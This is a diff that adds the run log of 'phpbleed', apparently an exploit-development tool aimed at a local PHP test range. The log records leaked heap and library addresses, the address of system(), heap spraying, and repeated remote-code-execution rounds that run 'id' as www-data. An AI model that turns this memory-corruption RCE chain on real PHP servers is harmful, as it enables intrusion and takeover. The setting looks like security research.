@@ -702,3 +702,178 @@ UnboundLocalError: cannot access local variable 'crash_count' where it is not as
   docker logs --tail 50 php-firing-range-bleed82-1
 
 [*] Total requests: 217 (crashes: 0)
+============================================================
+============================================================
+  phpbleed: heap -> ELF -> EG -> system() -> canary over HTTP
+  Target: http://127.0.0.1:8089/index.php
+============================================================
+18:47:58Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+  heap_ref = 0xed3f88a571a0
+  libphp           = 0xed3f8aaa0000
+  executor_globals = 0xed3f8b9c2e40 (offset 0xf22e40)
+  PLTGOT           = 0xed3f8b99ffe8
+  system() = 0xed3f8c0092c0
+  get_properties_for = handlers+0xc0
+18:47:58Z [R-6/R-7 round 1] opening fresh worker pin
+
+[Phase R-6] round 1: pinning one worker (keep-alive)
+18:47:58Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a78e40 (heap->size=400720)
+  spray slot verified @ 0xed3f88a78d00 (len=280, marker ok)
+  S = 0xed3f88a78d18
+18:47:58Z [R-6] S = 0xed3f88a78d18 (reqs=2)
+  S = 0xed3f88a78d18
+
+[Phase R-7] RCE trigger + canary exfil (round 1)
+18:47:58Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:47:59Z [R-7 id] cmd=b'id' -> NO RESPONSE (worker/pin crashed)
+18:47:59Z [R-7 id] docker-logs uid= check: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+18:47:59Z [R-7 round 1] no capture (S-stale-after-id); next round
+18:47:59Z [R-6/R-7 round 2] opening fresh worker pin
+
+[Phase R-6] round 2: pinning one worker (keep-alive)
+18:47:59Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a78e40 (heap->size=400704)
+  spray slot verified @ 0xed3f88a78d00 (len=280, marker ok)
+  S = 0xed3f88a78d18
+18:47:59Z [R-6] S = 0xed3f88a78d18 (reqs=6)
+  S = 0xed3f88a78d18
+
+[Phase R-7] RCE trigger + canary exfil (round 2)
+18:47:59Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:47:59Z [R-7 id] cmd=b'id' -> NO RESPONSE (worker/pin crashed)
+18:47:59Z [R-7 id] docker-logs uid= check: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+18:47:59Z [R-7 round 2] no capture (S-stale-after-id); next round
+18:47:59Z [R-6/R-7 round 3] opening fresh worker pin
+
+[Phase R-6] round 3: pinning one worker (keep-alive)
+18:47:59Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a78e40 (heap->size=400704)
+  spray slot verified @ 0xed3f88a78d00 (len=280, marker ok)
+  S = 0xed3f88a78d18
+18:47:59Z [R-6] S = 0xed3f88a78d18 (reqs=10)
+  S = 0xed3f88a78d18
+
+[Phase R-7] RCE trigger + canary exfil (round 3)
+18:47:59Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:48:00Z [R-7 id] cmd=b'id' -> NO RESPONSE (worker/pin crashed)
+18:48:00Z [R-7 id] docker-logs uid= check: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-d
+18:48:00Z [R-7 round 3] no capture (S-stale-after-id); next round
+18:48:00Z [R-6/R-7 round 4] opening fresh worker pin
+
+[Phase R-6] round 4: pinning one worker (keep-alive)
+18:48:00Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a78e40 (heap->size=400704)
+  spray slot verified @ 0xed3f88a78d00 (len=280, marker ok)
+  S = 0xed3f88a78d18
+18:48:00Z [R-6] S = 0xed3f88a78d18 (reqs=14)
+  S = 0xed3f88a78d18
+
+[Phase R-7] RCE trigger + canary exfil (round 4)
+18:48:00Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:48:00Z [R-7 id] cmd=b'id' -> NO RESPONSE (worker/pin crashed)
+18:48:01Z [R-7 id] docker-logs uid= check: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-d
+18:48:01Z [R-7 round 4] no capture (S-stale-after-id); next round
+18:48:01Z [R-6/R-7 round 5] opening fresh worker pin
+
+[Phase R-6] round 5: pinning one worker (keep-alive)
+18:48:01Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a78e40 (heap->size=400704)
+  spray slot verified @ 0xed3f88a78d00 (len=280, marker ok)
+  S = 0xed3f88a78d18
+18:48:01Z [R-6] S = 0xed3f88a78d18 (reqs=18)
+  S = 0xed3f88a78d18
+
+[Phase R-7] RCE trigger + canary exfil (round 5)
+18:48:01Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:48:01Z [R-7 id] cmd=b'id' -> NO RESPONSE (worker/pin crashed)
+18:48:01Z [R-7 id] docker-logs uid= check: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-d
+18:48:01Z [R-7 round 5] no capture (S-stale-after-id); next round
+18:48:01Z [R-6/R-7 round 6] opening fresh worker pin
+
+[Phase R-6] round 6: pinning one worker (keep-alive)
+18:48:01Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a78e40 (heap->size=400720)
+  spray slot verified @ 0xed3f88a78d00 (len=280, marker ok)
+  S = 0xed3f88a78d18
+18:48:01Z [R-6] S = 0xed3f88a78d18 (reqs=22)
+  S = 0xed3f88a78d18
+
+[Phase R-7] RCE trigger + canary exfil (round 6)
+18:48:01Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:48:02Z [R-7 id] cmd=b'id' -> NO RESPONSE (worker/pin crashed)
+18:48:02Z [R-7 id] docker-logs uid= check: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-d
+18:48:02Z [R-7 round 6] no capture (S-stale-after-id); next round
+18:48:02Z [R-6/R-7 round 7] opening fresh worker pin
+
+[Phase R-6] round 7: pinning one worker (keep-alive)
+18:48:02Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a78e40 (heap->size=400720)
+  spray slot verified @ 0xed3f88a78d00 (len=280, marker ok)
+  S = 0xed3f88a78d18
+18:48:02Z [R-6] S = 0xed3f88a78d18 (reqs=26)
+  S = 0xed3f88a78d18
+
+[Phase R-7] RCE trigger + canary exfil (round 7)
+18:48:02Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:48:03Z [R-7 id] cmd=b'id' -> NO RESPONSE (worker/pin crashed)
+18:48:03Z [R-7 id] docker-logs uid= check: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-d
+18:48:03Z [R-7 round 7] no capture (S-stale-after-id); next round
+18:48:03Z [R-6/R-7 round 8] opening fresh worker pin
+
+[Phase R-6] round 8: pinning one worker (keep-alive)
+18:48:03Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+
+[Phase R-6] Spray slot via heap->free_slot[16]
+  chunk_base = 0xed3f88a00000
+  free_slot[16] = 0xed3f88a78e40 (heap->size=400720)
+  spray slot verified @ 0xed3f88a78d00 (len=280, marker ok)
+  S = 0xed3f88a78d18
+18:48:03Z [R-6] S = 0xed3f88a78d18 (reqs=30)
+  S = 0xed3f88a78d18
+
+[Phase R-7] RCE trigger + canary exfil (round 8)
+18:48:03Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:48:03Z [R-7 id] cmd=b'id' -> NO RESPONSE (worker/pin crashed)
+18:48:03Z [R-7 id] docker-logs uid= check: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-d
+18:48:03Z [R-7 round 8] no capture (S-stale-after-id); next round
+18:48:03Z === exfil sequence finished without HTTP capture; check docker logs for cat output ===
+
+  No flag in HTTP stream yet; check 'their channel':
+  docker logs --tail 50 php-firing-range-bleed82-1
+
+[*] Total requests: 33 (crashes: 8)
